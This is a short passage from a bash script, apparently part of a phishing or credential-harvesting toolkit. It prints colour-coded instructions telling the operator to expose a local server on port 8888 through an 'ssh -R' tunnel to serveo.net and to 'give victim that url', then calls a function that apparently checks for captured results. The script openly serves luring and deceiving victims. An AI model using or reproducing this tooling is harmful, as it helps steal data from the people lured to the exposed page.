...
printf "\e[1;92m[\e[0m*\e[1;92m] Please open another terminal window and run 'ssh -R 80:127.0.0.1:8888 serveo.net' manualy and give victim that url. Due to ngrok restriction we are unable to add ngrok url. So, there you go with serveo. If you want custom subdomain just hit command on new window of terminal 'ssh -R subdomain:80:127.0.0.1:8888 serveo.net' Thank you.\e[0m\e[1;77m %s\e[0m\n"
checkfound
}
